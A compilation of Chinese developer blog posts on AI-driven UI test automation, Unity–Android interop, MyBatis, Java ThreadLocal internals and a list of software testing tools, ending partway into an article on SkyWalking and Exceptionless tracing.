图像切割：可以把一整张图片切割出不同的块，比如一张App的截屏，可以切割成导航栏、视频封面列表、搜索框等不同的块。
图像分类识别：对上面切割的块进行分类，需要图像分类的能力。
OCR文字识别：依赖图像 OCR 的识别能力，知道对应的视图里面有哪些文字。
图像相似度匹配能力：这一点传统的图像处理库就可以实现。比如Python的pillow库。
像素点的操作：可以依赖传统的框架，比如通过坐标完成操作，也可以使用机械臂来完成像素点的操作。

深度学习带来的机会
在深度学习以前，图像分类领域的准确率一定在75%以下，引入深度学习使准确率提高到98%、99%。有文章说准确率达到95%说明已经超过人类了，这是一个相当高的水平。

识别率在逐年提高。
ORC的能力主要体现在：完整准确率和文字准确率。
完整的准确率是指，在一个截图里面，会有一些标题和词组，如果标题里面有一个字出现了错误，就认为这个标题的识别是错误的，通过这种方式，准确率能够达到93%。
文字的准确率，是将一张截图分割成多个块，然后识别出每个块上的文字。因为已经分割了块，所以识别率可以达到98%。


终于介绍到AIon框架了。
有了上面这些技术做为基础以后，就可以尝试AIon框架实现了。
这中间还介绍了UI2Code 、pix2code两个“类似”框架的。它们是将截图生成用户界面代码，感兴趣可以百度了解。
这里直接介绍Alon的工作方法。敲黑板！这里考试重点。

AIon 会把一个截图切成几块：tab、导航、状态栏等，然后用深度学习图像分类，对每一块进行分类识别，识别完了以后，就会把对应块里的子元素提取出来，再用一些AI的技术，提取里面的内容，把它填充到子元素的属性里面去，最后就会得到二级视图树的结构，最后，就可以去做对应的点击操作了。

AIon的处理过程：

比如要实现一条测试用例，
首先截屏，对它进行场景判断，场景判断会应用到一些AI分类识别，识别出当前界面有没有弹出对话，或者它是否是登陆页的场景识别。场景识别完了以后，就会进行传统的图像切割，图像切割完了以后，进行布局分类，布局分类也会应用到一些AI的技术，分类完了以后，进行子元素的提取，对这个子元素进行填充，填充会应用到一些AI的技术。
最后，当视图树构建完了之后，匹配之前写的测试用例里面的条件进行匹配，匹配之后，执行测试用例，这就是整个AIon的核心流程。
由于考虑到之前的一些测试用例，还有一些传统的测试框架写的测试用例，本身还做了对传统测试框架的融合。
AIon的处理过程中涉及到一些技术问题这里就省略了，通篇阅读下来有点像论文。强烈建议阅读原文，我这里只是简化了对原文的解读。
从中get到了一些基于AI实现自动化框架的思路。未来的自动化测试肯定会越来越使用更简单，功能更强大。要么去实现AI自动化框架，要么被AI自动化框架淘汰！你选吧！
阅读原文

********************************************************************************************************************************************************************************************************
unity与安卓通讯的一些事儿
1、unity与安卓通讯的两种方法：
第一种是unity导出安卓工程，在unity的BuildSetting窗口可以将unity工程导出为安卓工程，然后再用Eclipse或者Android Studio打开，Eclipse目前已经被放弃了，现在安卓开发都用Android Studio，然后写完通讯业务，再由Android Studio导出apk；第二种方法是在Android Studio中创建一个Module，将通讯接口写在这个Module里面，再导出jar包，将这个jar包以及manifest文件导入unity工程面板，放在Plugins/Android文件夹下，供unity调用。我们通常使用第二种方法。
 
2、unity如何调用安卓

public class UnityCallAndroid:MonoBehaviour{

    private AndroidJavaClass ajc;
    private AndroidJavaObject ajo;
    
    // Use this for initialization
    void Start () {
        ajc = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
        ajo = ajc.GetStatic<AndroidJavaObject>("currentActivity");
    }

   //调用安卓方法
    public void callAndroid()
    {
        ajo.Call("broadcast");//参数是方法名，可以带参数，可以有返回值
    }
   
}

3、安卓如何调用unity

public class Main2Activity extends UnityPlayerActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
    }

    //调用unity
    public void callUnity(String obj,String func,String params)
    {
        //第一个参数是挂载脚本的gameobject，第二个参数是方法名，最后是方法参数
        UnityPlayer.UnitySendMessage(obj,func,params);
    }

4、需要注意的事
首先，Android Studio导出jar包时，需要配置好对应的manifest文件，注意包名、最小支持的API Level和target API Level需要与unity中的Player Setting中的设置保持一致，其实unity在导出apk时也会有一份manifest文件，在unity安装目录比如unity2017\Editor\Data\PlaybackEngines\AndroidPlayer\Apk中，有一个unity的默认AndroidManifest文件，在你导出apk时，unity会复制一份该manifest文件，然后根据playerSetting上的设置来修改该manifest，注意多个manifest文件的冲突；另外，需要安装好对应的android sdk版本，不然导出时会报错。
 
5、unity如何发送接收安卓广播
安卓广播机制就是在安卓中，有一些操作完成以后，会发送广播，如果某个程序接收了这个广播，就会做相应的处理。这个广播机制是由安卓操作系统提供的，广播需要有发送者和接收者，在发送者中，可以这样写这样一个java方法供unity调用：


//发送广播
public void broadcast(String name,String content)
{
    Intent intent=new Intent();
    intent.setAction(name);//广播的名字
    intent.putExtra("content",content);//指定广播内容
    sendBroadcast(intent); //发送广播
}

在接收广播之前，我们需要注册一个广播，而注册分两种：静态注册、动态注册，静态注册是将需要监听的广播写进manifest文件中，动态注册则是在代码中注册，比如：


@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    intentFilter=new IntentFilter();
    actionName="";
    intentFilter.addAction(actionName);
    msgListener=new MsgListener();
    registerReceiver(msgListener,intentFilter);
}

接收广播就必须写一个类继承BroadcastReceiver：


//广播监听类
class MsgListener extends BroadcastReceiver
{
    @Override
    public void onReceive(Context content, Intent intent)
    {
        String action=intent.getAction();
        if (actionName.equals(action))
        {
            String msg=intent.getStringExtra("content");
            Toast.makeText(getApplicationContext(),msg,Toast.LENGTH_SHORT).show();
        }
    }
}

6、unity如何接收到广播后从后台切换到前台

@Override
public void onReceive(Context content, Intent intent)
{
    String action=intent.getAction();
    if (actionName.equals(action))
    {
        String msg=intent.getStringExtra("content");
        Toast.makeText(getApplicationContext(),msg,Toast.LENGTH_SHORT).show();
        //后台到前台
        Intent inten = new Intent("android.intent.action.MAIN");
        inten.setComponent(new ComponentName(getApplicationContext().getPackageName(), Main2Activity.class.getName()));
        intent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                | Intent.FLAG_ACTIVITY_NEW_TASK
                | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);
        getApplicationContext().startActivity(inten);
    }
}

按上面这种方法，每次都会重启该Activity，如果只想单纯的从后台切换到前台，可以使用singleInstance的方式，只需在manifest文件中加入android:launchMode="singleInstance"即可
 
7、unity安卓程序如何保活（减小被安卓系统杀死的几率）
普通的程序无法像微信这种大佬一样直接加入白名单，那么如何做app进程的保活呢，方法有很多，一是启动前台Service，伴随着Notification（通知栏），系统会默认给进程高优先级，第二种是使用两个进程互相守护，如果其中一个进程监测到另一个进程被杀死，马上拉起它，第三种是一像素保活，很流氓的方法，但也很有效，就是在手机黑屏时创建一个透明像素的Activity，亮屏时就关闭。方法有很多，我暂时用过的只有是第一种，其他还没试过。Service写法是这样：


public class  MyService extends Service
{
    /** 标识服务如果被杀死之后的行为 */
    int mStartMode;

    /** 绑定的客户端接口 */
    IBinder mBinder;

    /** 标识是否可以使用onRebind */
    boolean mAllowRebind;

    /** 当服务被创建时调用. */
    @Override
    public void onCreate() {
        super.onCreate();
    }

    /** 调用startService()启动服务时回调 */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return 0;
    }

    /** 通过bindService()绑定到服务的客户端 */
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /** 通过unbindService()解除所有客户端绑定时调用 */
    @Override
    public boolean onUnbind(Intent intent) {
        return mAllowRebind;
    }

    /** 通过bindService()将客户端绑定到服务时调用*/
    @Override
    public void onRebind(Intent intent) {

    }

    /** 服务不再有用且将要被销毁时调用 */
    @Override
    public void onDestroy() {
        super.onDestroy();
    }

最后，在manifest文件中加上：<service android:name=".MyService" />
 
如有错误，欢迎指正


 
 
 


********************************************************************************************************************************************************************************************************
MyBatis持久层框架学习之01 MyBatis的起源和发展
一、MyBatis的简介
　　 MyBatis 是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架。
 　   MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。
        MyBatis可以使用简单的XML或注解用于配置和原始映射，将接口和Java的POJO（Plain Old Java Objects，普通的Java对象）映射成数据库中的记录.
二、MyBatis的历史
　　原是apache的一个开源项目iBatis, 2010年6月这个项目由apache software foundation 迁移到了google code，随着开发团队转投Google Code旗下，ibatis3.x正式更名为Mybatis ，代码于2013年11月迁移到Github。
　　iBATIS一词来源于“internet”和“abatis”的组合，是一个基于Java的持久层框架。iBATIS提供的持久层框架包括SQL Maps和Data Access Objects(DAO)
　　
三、MyBatis的基本说明
　　(1)、MyBatis是一个工作在持久层的框架,它不再是一个标准的ORM框架
　　　　 我们先看看Hibernate是如何对数据库进行操作

　　     我们再来看看Mybatis如何对数据库进行操作

 　　因为它只管理了SQL语句和Java之间的关联和映射,生成的实体类将不会自动创建表了,而是我们程序员自己去创建,你这边写的SQL语句是自己写,而不是Hibernate通过save或者delete帮助我们进行创建。
  (2)、前身是ibatis, 在ibatis3.x 时，更名为 MyBatis
　所以说,在面试或者开发的时候会听到IBatis,MyBatis,其实指的是一个东西。
  
  (3)、MyBatis在java和sql之间提供更灵活的映射方案,MyBatis将sql语句和方法实现，直接写到xml文件中，实现和java程序解耦
　      为何这样说,MyBatis将接口和SQL映射文件进行分离,相互独立,但又通过反射机制将其进行动态绑定。
　　   其实它底层就是Mapper代理工厂[MapperRegistry]和Mapper标签映射[MapperStatement],它们两个说穿了就是Map容器,就是我们常见的HashMap、ConcurrentHashMap。
　　   在后面我会具体分析MyBatis四大组件的工作原理。
 
　　 所以说,MyBatis使用面向接口的方式这种思想很好的实现了解耦和的方式,同时易于开发者进行定制和扩展,比如我们熟悉的通用Mapper和分页插件pageHelper,方式也非常简单,后面会详细进行说明。
　　(4)、 mybatis只负责sql, 建库建表的工作由程序员完成
　　在使用Hibernate的时候,建表的工作也是由框架帮助我们完成,Hibernate本身就是一个全自动的框架,MyBatis是一个半自动的框架,建表在很多时候我们需要对数据类型和字段进行更信详细的定义和分析,所以说,在实际的生产环境中,MyBatis的这种方式更加符合开发者的习惯
　 小结:Hibernate相对MyBatis的差异化和区别
　　(1).Hibernate是一个标准的ORM框架,MyBatis不再是一个标准的ORM框架,它工作在持久层
　　(2).Hibernate是一个全自动的框架,MyBatis是一个半自动的框架
　　(3).Hibernate将对数据库的操作全封闭化,MyBatis将其透明化[SQL编写]
　　(4).MyBatis相对Hibernate来说更加优秀,更加流行
　　(5).Hibernate是一个重量级的框架,MyBatis相对来说更加轻量级,类似Struts2和SpringMVC
　　(6).Hibernate的学习成本更高,MyBatis相对来说更低
　　(7).从耦合度来说,MyBatis实现了最大程度化的解耦,通过面向接口的方式来进行解决
　　
　  MyBatis很好的借鉴了Hibernate的好的一面,那就是查询后将数据结果集映射的封装工作还是交给我来完成,编写SQL由你自己去完成,处理复杂的自定义结果集映射的权利也交给你来做。
　　简单的工作封装交给我来做,所以说,这对于Hibernate来说是致命的,因为Hibenate将对表的操作转换为对对象的操作,只需通过操作对象就能帮助我们发送SQL,这是它本身最大的特点优势。
       但是,所有的操作都受限于让Hibernate本身来完成,Hibernate最大的优势反而变成了劣势,试想,一位优秀的DBA，对原生的SQL进行了优化,但受限于Hibernate本身的特性,有种浑身无力使的感觉,这也注定Hibernate被MyBatis取代只是时间问题。　
   　　
四、为什么要使用MyBatis?
　　MyBatis是一个半自动化的持久化层框架。
 
　　jdbc编程---当我们使用jdbc持久化的时候，sql语句被硬编码到java代码中。这样耦合度太高。代码不易于维护。在实际项目开发中会经常添加sql或者修改sql，这样我们就只能到java代码中去修改。
 
　　Hibernate和JPA
　　长难复杂SQL，对于Hibernate而言处理也不容易
　　内部自动生产的SQL，不容易做特殊优化。
　　基于全映射的全自动框架，javaBean存在大量字段时无法只映射部分字段。导致数据库性能下降。
　　
　　对开发人员而言，核心sql还是需要自己优化
　　sql和java编码分开，功能边界清晰，一个专注业务、一个专注数据。
　　可以使用简单的XML或注解用于配置和原始映射，将接口和Java的POJO映射成数据库中的记录。成为业务代码+底层数据库的媒介
　
五、动态SQL映射
　　  如果说MyBatis的SQL映射,接口和文件分离这种方式决定了MyBatis的优势,那么MyBatis的动态SQL直接决定了MyBatis它绝对的霸主地位,我们知道后端几乎都是Spring家族的天下,那么它肯定想过使用自家的产品将MyBatis淘汰,它确实做过,但是没有干掉MyBatis,所有MyBatis借助这两大优势和特点,当然MyBatis还有很多优秀的地方,慢慢替代了Hibernate
　　 在一个实际的项目中，sql语句往往是比较复杂的，为了满足更加复杂的业务需求，MyBatis的设计者，提供了动态生成SQL的功能,动态SQL就是根据不同的情况在同一个业务逻辑里面产生的SQL语句是变化的,也就是说根据实际的业务需求同样一段代码产生SQL语句是不一样的,。
　　 在实际的开发中,我们会遇到比较复杂的业务需求,在这种复杂的业务需求中,我们可能需要发送好几个SQL语句才能够去处理的,那么如果我们可以对这个SQL语句进行适当的编程,那么这个SQL语句将会变得非常强大,那么比如说有些数据库是支持存储过程的,这个存储过程其实就是直接使用SQL语句来进行编程,可以根据你不同的情况动态的产生SQL语句
　　如果我们有相同的业务需求,在这个业务需求中有不同的情况,那我根据不同的情况在同一种请求里面产生的SQL语句也不一样即解决了你要学习存储过程的麻烦,而且存储过程整合起来也很痛苦,同时还解决了可以灵活的适用复杂的业务需求,所以这也是MyBatis优秀的原因,也是它为何能够流行起来
　　MyBatis它研究了很多地方,让程序更加灵活,它能够设计一个产品,快速的简洁的解决一些需求这才是最好的,这些其实他也能解决,写一个存储过程即可,但是存储过程一些,代码的复杂度又变高了
　　MyBatis就让你在Mapper里面可以使用if,for循环,多分支语句根据不同的情况产生不同的SQL语句,这就是MyBatis厉害的地方
　　所以MyBatis在一定程度上就有点把Hibernate就让它有点受不了的地方,因为MyBatis业务需求设计的太好了,这也是目前SSM为何比SSH更流行的原因所以大家一看,好多年解决的问题,设计的问题别人都帮助我们进行了解决,没有理由不用它
　　哪怕现在流行的分布式和微服务架构,在持久层来说,很大程度上还是使用MyBatis来做持久层,虽然越来越多的项目都是基于SpringBoot,但持久层还是Mybatis用的非常多
　　
        MyBatis为何在一定程度上它能够让大家喜欢,用它,就是他让以前的工作变得更加简单容易,而不是变得更难了,如果一样东西变得越来越难,那就没人用它
　　
　　但是随着技术的发展,将来还会有更好的框架来替代MyBatis,这是肯定的,技术本身就是要不断发展的,如果技术不再发展了,那么我们程序员的价值就会大大降低,因为不需要在学习了,几次互联网的高潮都是由于新技术的产生.导致程序员的薪水大幅度增长
 
六、总结
　　我们通过不同的角度去分析,通过和同期的竞争对手以及在实际的生产环境中,MyBatis都是很优秀的一个持久层框架,我们必须好好学习并掌握它,不光是它的使用,以及它底层的基本原理,这些放在后面会详细介绍,应大家要求,先编写MyBatis系列的文章,同时也非常感谢大家的支持!　　
　　
 
 
　　
 
********************************************************************************************************************************************************************************************************
多线程学习笔记九之ThreadLocal

    目录
    
        
        多线程学习笔记九之ThreadLocal
        简介
        类结构
        
        源码分析
        ThreadLocalMap
        set(T value)
        get()
        remove()
        
        为什么ThreadLocalMap的键是WeakReferrence?
        总结
        
        
    

多线程学习笔记九之ThreadLocal
简介
  ThreadLocal顾名思义理解为线程本地变量，这个变量只在这个线程内，对于其他的线程是隔离的，JDK中对ThreadLocal的介绍：

This class provides thread-local variables. These variables differ from their normal counterparts in that each thread that accesses one (via its{@code get} or {@code set} method) has its own, independently initialized copy of the variable. {@code ThreadLocal} instances are typically private static fields in classes that wish to associate state with a thread (e.g.,a user ID or Transaction ID).

大意是ThreadLocal提供了线程局部变量，只能通过ThreadLocal的set方法和get方法来存储和获得变量。
类结构
  ThreadLocal类结构如下：

可以看到ThreadLocal有内部类ThradLocalMap,ThreadLocal存储线程局部对象就是利用了ThreadLocalMap数据结构，在下面的源码分析也会先从这里开始。
源码分析
ThreadLocalMap
  ThreadLocalMap静态内部类Entry是存储键值对的基础，Entry类继承自WeakReference(为什么用弱引用在后面解释)，通过Entry的构造方法表明键值对的键只能是ThreadLocal对象，值是Object类型，也就是我们存储的线程局部对象，通过super调用父类WeakReference构造函数将ThreadLocal<?>对象转换成弱引用对象
  ThreadMap存储键值对的原理与HashMap是类似的，HashMap依靠的是数组+红黑树数据结构和哈希值映射，ThreadMap依靠Entry数组+散列映射，ThreadLocalMap使用了Entry数组来保存键值对，Entry数组的初始长度为16，键值对到Entry数组的映射依靠的是int i = firstKey.threadLocalHashCode & (INITIAL_CAPACITY - 1);,通过ThreadLocal对象的threadLocalHashCode与(INITIAL_CAPACITY - 1)按位相与将键值对均匀散列到Entry数组上。
    static class ThreadLocalMap {

        // 键值对对象
        static class Entry extends WeakReference<ThreadLocal<?>> {
            /** The value associated with this ThreadLocal. */
            Object value;

            Entry(ThreadLocal<?> k, Object v) {
                super(k);
                value = v;
            }
        }

        //初始Entry数组大小
        private static final int INITIAL_CAPACITY = 16;

        //Entry数组
        private Entry[] table;

        //ThreadLocalMap实际存储键值对的个数
        private int size = 0;

        //数组扩容阈值
        private int threshold; // Default to 0

        //阈值为数组长度的2/3
        private void setThreshold(int len) {
            threshold = len * 2 / 3;
        }

        private static int nextIndex(int i, int len) {
            return ((i + 1 < len) ? i + 1 : 0);
        }

        /**
         * Decrement i modulo len.
         */
        private static int prevIndex(int i, int len) {
            return ((i - 1 >= 0) ? i - 1 : len - 1);
        }
        
        //构造一个ThreadLocalMap对象，并把传入的第一个键值对存储
        ThreadLocalMap(ThreadLocal<?> firstKey, Object firstValue) {
            table = new Entry[INITIAL_CAPACITY];
            int i = firstKey.threadLocalHashCode & (INITIAL_CAPACITY - 1);
            table[i] = new Entry(firstKey, firstValue);
            size = 1;
            setThreshold(INITIAL_CAPACITY);
        }

    }

  ThreadLocal作为做为键值对的键通过常量threadLocalHashCode映射到Entry数组,threadLocalHashCode初始化时会调用nextHashCode()方法，就是在nextHashCode的基础上加上0x61c88647,实际上每个ThreadLocal对象的threadLocalHashCode值相差0x61c88647，这样生成出来的Hash值可以较为均匀的散列到2的幂次方长度的数组中，具体可见这篇文章为什么使用0x61c88647
  由于采用的是散列算法，就需要考虑Hash冲突的情况，HashMap解决Hash冲突的方法是链表+红黑树，ThreadLocalMap解决方法是linear-probe（线性探测），简单来说如果散列对应的位置已经有键值对占据了，就把散列位置加/减一找到符合条件的位置放置键值对。
    // final常量，一旦确定不再改变
    private final int threadLocalHashCode = nextHashCode();

    /**
     * The next hash code to be given out. Updated atomically. Starts at
     * zero.
     */
    private static AtomicInteger nextHashCode =
        new AtomicInteger();

    /**
     * The difference between successively generated hash codes - turns
     * implicit sequential thread-local IDs into near-optimally spread
     * multiplicative hash values for power-of-two-sized tables.
     */
    private static final int HASH_INCREMENT = 0x61c88647;

    /**
     * Returns the next hash code.
     */
    private static int nextHashCode() {
        return nextHashCode.getAndAdd(HASH_INCREMENT);
    }

    //构造方法
    public ThreadLocal() {
    }
set(T value)
  简要介绍完了内部类ThreadLocalMap后，set方法属于ThreadLocal,首先获得与线程Thread绑定的ThreadLocalMap对象，再将ThreadLocal和传入的value封装为Entry键值对存入ThreadLocalMap中。注意，ThreadLocalMap对象是在线程Thread中声明的：
ThreadLocal.ThreadLocalMap threadLocals = null;
    public void set(T value) {
        //获得当前线程对象
        Thread t = Thread.currentThread();
        //获得线程对象的ThreadLocalMap
        ThreadLocalMap map = getMap(t);
        // 如果map存在，则将键值对存到map里面去
        if (map != null)
            map.set(this, value);
        //如果不存在，调用ThreadLocalMap构造方法存储键值对
        else
            createMap(t, value);
    }

    //返回线程t中声明的Thread
    ThreadLocalMap getMap(Thread t) {
        return t.threadLocals;
    }

    void createMap(Thread t, T firstValue) {
        t.threadLocals = new ThreadLocalMap(this, firstValue);
    }

set(ThreadLocal<?> key, Object value)
  在ThreadLocalMap存在的情况下，调用ThreadLocal类的set方法存储键值对，set方法需要考虑散列的位置已经有键值对：如果已经存在的键值对的键当存入的键，覆盖键值对的值；如果键值对的键ThreadLocal对象已经被回收，调用replaceStaleEntry方法删除table中所有陈旧的元素（即entry的引用为null）并插入新元素。

    private void set(ThreadLocal<?> key, Object value) {        
        Entry[] tab = table;
        int len = tab.length;
        //利用ThreadLocal的threadLocalHahsCode值散列
        int i = key.threadLocalHashCode & (len-1);

        //如果散列的位置不为空，判断是否是哈希冲突
        for (Entry e = tab[i];
             e != null;
             e = tab[i = nextIndex(i, len)]) {
            ThreadLocal<?> k = e.get();
            
            //如果此位置的键值对的键与传入的键相同，覆盖键值对的值
            if (k == key) {
                e.value = value;
                return;
            }

            //键值对的键为空，说明键ThreadLocal对象被回收，用新的键值对代替过时的键值对
            if (k == null) {
                replaceStaleEntry(key, value, i);
                return;
            }
        }

        //散列位置为空，直接存储键值对
        tab[i] = new Entry(key, value);
        int sz = ++size;
        if (!cleanSomeSlots(i, sz) && sz >= threshold)
            rehash();
    }
get()
  获得当前线程中保存的以ThreadLocal对象为键的键值对的值。首先获取当前线程关联的ThreadLocalMap,再获得以当前ThreadLocal对象为键的键值对，map为空的话返回初始值null，即线程局部变量为null，
    public T get() {
        //获取与当前线程绑定的ThreadLocalMap
        Thread t = Thread.currentThread();
        ThreadLocalMap map = getMap(t);
        //map不为空，获取键值对对象
        if (map != null) {
            ThreadLocalMap.Entry e = map.getEntry(this);
            if (e != null) {
                @SuppressWarnings("unchecked")
                T result = (T)e.value;
                return result;
            }
        }
        return setInitialValue();
    }

    private Entry getEntry(ThreadLocal<?> key) {
        //散列
        int i = key.threadLocalHashCode & (table.length - 1);
        Entry e = table[i];
        //判断散列位置的键值对是否符合条件:e.get()==key
        if (e != null && e.get() == key)
            return e;
        else
            return getEntryAfterMiss(key, i, e);
    }

    //线性探测寻找key对应的键值对
    private Entry getEntryAfterMiss(ThreadLocal<?> key, int i, Entry e) {
        Entry[] tab = table;
        int len = tab.length;

        while (e != null) {
            ThreadLocal<?> k = e.get();
            if (k == key)
                return e;
            if (k == null)
                expungeStaleEntry(i);
            else
                i = nextIndex(i, len);
            e = tab[i];
        }
        return null;
    }

remove()
  从ThreadLocalMap中移除键值对，一般在get方法取出保存的线程局部变量后调用remove方法防止内存泄露。
    public void remove() {
        ThreadLocalMap m = getMap(Thread.currentThread());
        if (m != null)
            m.remove(this);
    }
为什么ThreadLocalMap的键是WeakReferrence?
  键值对对象Enry的键是ThreadLocal对象，但是使用WeakReferrence虚引用包装了的，虚引用相对于我们经常使用的String str = "abc"这种强引用来说对GC回收对象的影响较小，以下是虚引用的介绍：

WeakReference是Java语言规范中为了区别直接的对象引用（程序中通过构造函数声明出来的对象引用）而定义的另外一种引用关系。WeakReference标志性的特点是：reference实例不会影响到被应用对象的GC回收行为（即只要对象被除WeakReference对象之外所有的对象解除引用后，该对象便可以被GC回收），只不过在被对象回收之后，reference实例想获得被应用的对象时程序会返回null。

  如果Entry的键使用强引用，那么我们存入的键值对即使线程之后不再使用也不会被回收，生命周期将变得和线程的生命周期一样。而使用了虚引用之后，作为键的虚引用并不影响ThreadLocal对象被GC回收，当ThreadLocal对象被回收后，键值对就会被标记为stale entry(过期的键值对),再下一次调用set/get/remove方法后会进行  ThreadLocalMap层面对过期键值对进行回收，防止发生内存泄漏。
注意：当我们使用了set方法存入局部变量后，如果不进行get/remove,那么过期的键值对无法被回收，所以建议在get取出存储变量后手动remove，可以有效防止内存泄漏。
总结
  ThreadLocal实现了存储线程局部变量，ThreadLocal的实现并不是HashMap<Thread,Object>以线程对象为键，而是在线程内部关联了一个ThreadLocalMap用于存储键值对，键值对的键是ThreadLocal对象，所以ThreadLocal对象本身是不存储内容的，而是作为键与存储内容构成键值对。
********************************************************************************************************************************************************************************************************
测试人员需要了解工具使用
我们将常用的测试工具分为10类。
1. 测试管理工具
2. 接口测试工具
3. 性能测试工具
4. C/S自动化工具
5.白盒测试工具
6.代码扫描工具
7.持续集成工具
8.网络测试工具
9.app自动化工具
10.web安全测试工具
注：工具排名没有任何意义。
大多数初学者，或者某个领域知识的入行者，习惯性地去搜集各种看似无用的资料、视频、工具。其实，如果都去研读、理解、并应用之，还是有点用的。否则，只会占用磁盘空间，还浪费时间。然而，工具嘛。虽然不用全部搞懂。但，还是要懂一点的。
混在软件测试职业圈。至少要知道有哪些工具可用。什么时候该用什么工具，每个工具能解决什么问题。然后，深入应用几款工具，即可。
下面我为大家提供了一个丰富的软件测试工具列表。这些测试工具不仅可以减少测试工作，而且帮助更快地将你的软件/应用程序推向市场，并在保持速度的同时保证质量。
1.测试管理工具
1，TestDirector(大而全)
2，jira(简单好用)
3，Quality Center(复杂，收费)
4，禅道（简单好用）
5，bugzilla(功能简单)
6，svn(代码和文档管理工具)
7，vss类似svn
8，git，同svn，但是多分支管理比svn好
9，Note（大而全，费用太贵）
10，CQ(ClearQuest-IBM产品-大而全)
2.接口测试工具
1，Jmeter（开源）
2，postman
3，SoapUI
推荐使用 jmeter 和 postman
jmeter是一款100%纯Java编写的免费开源的工具，它主要用来做性能测试，相比loadrunner来说，它内存占用小，免费开源，轻巧方便、无需安装，越来越被大众所喜爱。
Postman是谷歌的一款接口测试插件，它使用简单，支持用例管理，支持get、post、文件上传、响应验证、变量管理、环境参数管理等功能，可以批量运行，并支持用例导出、导入。
3.性能测试工具
1，loadrunner，大而全，要学精通还是有点难度，重量级工具
2，jmeter 基于java平台的性能开源测试工具，其实也很强大，而且比较好用
3，Web bench 一个简单的web基准指标测试工具
4，Load UI，一款开源的压力测试工具，支持图形化
5，httperf 一款高性能的web性能测试工具
6，Siege 一款开源的压力和指标测试工具
7、Gatling
前两种是比较常用的
4.C/S自动化工具
1，qtp (录制回放和脚本编辑)，用到的是vb语言
2，winrunner IBM产品类似qtp
3，autoit 在窗口定位上做到很不错
5.白盒测试工具
1，jtest java语言的单元测试框架
2，JUnit 验证java的工具
3，cppunit 跨平台的c++单元测试框架
4，gtest 跨平台的c++单元测试框架
5，PhpUnit Php
6，BoundsChecker C++,Delphi API和OLE错误检查、指针和泄露错误检查、内存错误检查
7，TrueTime C++,Java,Visual Basic 代码运行效率检查、组件性能的分析
6.代码扫描工具
1，Coverity源代码静态分析工具
2，cppcheck c++静态扫描工具
3，gcover代码覆盖率工具
4，findbugs：基于字节码分析，大量使用数据流分析技术，侧重运行时错误检测，如空指针引用等
5，SonarLint
6，TscanCode
7持续集成工具
1，jenkins
2，Hudson
8.网络测试工具
1，思博伦 目前流行的一款网络自动化测试商用平台了(而且能够完全顶替loadrunner)，基本上能够满足所有的网络产品测试需求了，不过很贵
2，Ixia，也是对网络设备进行性能和压力测试工的平台
3，wireshark 数据包抓取分析和回放测试工具
4，tc 网络丢包和试验模拟工具，非常好用
5，iperf 用来测试tcp和udp的网络质量
6，tcpping工具工作在 TCP 层，通过发送伪造的 TCP SYN 包并侦听来自服务器或中间设备返回的 SYN/ACK 或 RST
9.app自动化工具
1，appium 这个应该算是目前最流行的基于app的自动化测试框架了
2，instruments ios平台下的自动化测试框架，用java语言写的
3，uiautomator安卓自动化测试框架，基本上支持安卓的所有事件操作
4，Monkey 安卓自带的测试工具
5，Monkey Runner Monkey改进版，支持自己编写脚本测试，用Python语言
6，Robotium 一款国外的Android自动化测试框架，用法比较简单
10.web安全测试工具
金融服务和银行业一直是安全漏洞的受害者，因为会破坏了大量敏感的用户数据。然而，金融服务是每个人的必备品。所以在这里我们列出了一些安全测试工具，用于构建一个健壮的应用程序。
1，appscan，算是用的非常多的一款工具了，扫描后能够将绝大部分的漏洞找出来。
2，Netsparker Community Edition 这个程序可以检测SQL注入和跨页脚本事件。牛逼的是还能提供解决方案
3，Websecurify 这是个简单易用的开源工具，此程序还有一些人插件支持，可以自动检测网页漏洞。运行后可生成多种格式的检测报告
4，Wapiti 这是一个用Python编写的开源的工具，可以检测网页应用程序，探测网页中存在的注入点。
5，N-Stalker Free Version 此工具可一次检测100个以上的页面，包括跨页脚本的检测。
6，skipfish 这是一个轻量级的安全测试工具，处理速度很快，每秒可处理2000个请求。
7，Scrawlr HP的一款免费软件，可检测SQL注入漏洞。
8，Watcher: 这个是Fiddler的插件，可在后台静默运行，可检测跨域提交等。。
9，WebScarab 这个实际上是一个代理软件，有很多功能，可以检测XSS跨站脚本漏洞、SQL注入漏洞等。。
10，抓包工具:fiddler
11、burpsuite：暴力破解、抓包工具
总结：
现在大热的敏捷模式，DevOps以及许多现代日常的软件开发方法/概念都在支持测试在整个SDLC过程中的相关性。
软件测试工具是催化剂，将决定市场带给测试的新时代挑战的速度。
“ 善于利用工具，能提高工作效率。但，勿太依赖工具，任何的工具，只可辅助。”
********************************************************************************************************************************************************************************************************
NET Core微服务之路：实战SkyWalking+Exceptionless体验生产下追踪系统
前言
当一个APM或一个日志中心实际部署在生产环境中时，是有点力不从心的。
比如如下场景分析的问题：


从APM上说，知道某个节点出现异常，或延迟过过高，却不能及时知道日志反馈情况，总不可能去相应的节点上一个一个的翻日志文件吧。


从日志中心上说（特别是Exceptionless，能及时反馈出异常信息），知道某个节点出现异常日志，可不知道引起异常的源头在哪；或者出现延迟过高日志，却不能及时知道节点问题，还是链路问题；就算诸上问题都能应付，那么一行行的、一个个的日志文件和使用图形化的表述形式，谁会更加直观，当然，你说你可以一目十行，甚至百行来分析日志，那我挺佩服你的。




 

本节内容较多，所以笔者特列举了如下目录。
 
一：准备
    1.SkyWalking和Exceptionless简单回顾
    2.新建多个站点（物理节点）
    3.附加SkyApm-dotnet程序集到宿主
二：将SkyApm-dotnet的日志输出到Exceptionless
    4.SkyApm-dotnet的日志入口
    5.继承ILoggerFactory获取全局ILogger对象
    6.将Logger写入到Exceptionless
三：运行
    7.SkyWalking和Exceptionless的结合分析
 
 
SkyWalking和Exceptionless简单回顾
  
前两篇就《NET Core微服务之路：SkyWalking+SkyApm-dotnet分布式链路追踪系统的分享》和《NET Core微服务之路：简单谈谈对ELK，Splunk，Exceptionless统一日志收集中心的心得体会》简单的介绍了SkyApm-dotnet和三个日志收集中心。为何最终会选择SkyWalking和Exceptionless来作为生产实战，很简单：
